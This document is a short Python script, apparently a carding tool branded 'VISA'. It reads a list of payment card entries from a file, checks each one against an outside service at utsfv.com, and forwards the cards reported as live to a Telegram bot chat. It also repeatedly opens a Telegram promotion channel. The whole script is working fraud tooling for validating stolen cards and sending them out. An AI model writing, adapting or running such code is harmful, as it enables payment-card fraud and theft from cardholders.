from os import system as os
try:
	import requests
	from requests import get
	from pyfiglet import figlet_format as log
	from webbrowser import open as Open
	from time import sleep
	from random import choice
except :
	os("pip install requests")
	os("pip install pyfiglet")
	os("pip install webbrowser")
# ┅  ┅  ┅  ┅  ┅  ┅  ┅  ┅
Y = "\033[1;34m" #ازرق فاتح
W = "\033[2;31m"  #احمر ثان
B = "\033[1;90m"  #اسود فاتح
C = "\033[1;97m"  #ابيض
E = "\033[1;92m"  #اخضر
H = "\033[1;93m"  #اصفر
K = "\033[1;94m"  #ازرق
L = "\033[1;95m"  #ارجواني
G = "\033[1;32m"#اخضر
R = "\033[1;31m"#احمر
M = "\033[1;37m"#ابيض
# ┅  ┅  ┅  ┅  ┅  ┅  ┅  ┅
Open("https://t.me/configat7")
def Logo():
		logo=Y+"="*55+"\n"+G+(log("         V I S A"))+"\n"+B+"      Programming : 𝗔𝗛𝗠𝗘𝗗 𖡶⁪⁬⁮⁮⁮⁮ 🇪🇬 - T.me/O99_5_O  "+"\n"+Y+"="*55
		for i in logo.splitlines():
			sleep(0.05)
			print(i)
Logo()
print(G)
id=input("[√] ID : ")
print(B)
token=input("[√] Token : ")
#file=input("%s[%s=%s]%s File Name %s:%s "%(H,M,H,W,C,G))
os("clear")
Open("https://t.me/configat7")
Logo()
visa=open(input("%s[%s=%s]%s File Name %s:%s "%(H,M,H,W,C,G)),mode="r",encoding="UTF-8").read().splitlines()
print(f"[=] Total : {len(visa)}")
cv=len(visa)
print(M+"="*55)
Open("https://t.me/configat7")
for cc in visa:
	cv-=1
	response=(get("https://utsfv.com/dead/ck.php?lista=%s&amount=1&sec=undefined"%(cc)).text)
	if "𝙐𝙣𝙠𝙣𝙤𝙬𝙣" in response:
		print("%s[%s=%s] UnKnown : %s%s %s| Remain : %s"%(H,M,H,H,cc,G,cv))
	else:
		requests.post(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=⌯ New Visa Avilable
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
⌯ Email : {cc}
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
<\> PY : @O99_5_O </>''')
		print("%s[%s=%s] Live  : %s%s %s| Remain : %s"%(G,M,G,G,cc,G,cv))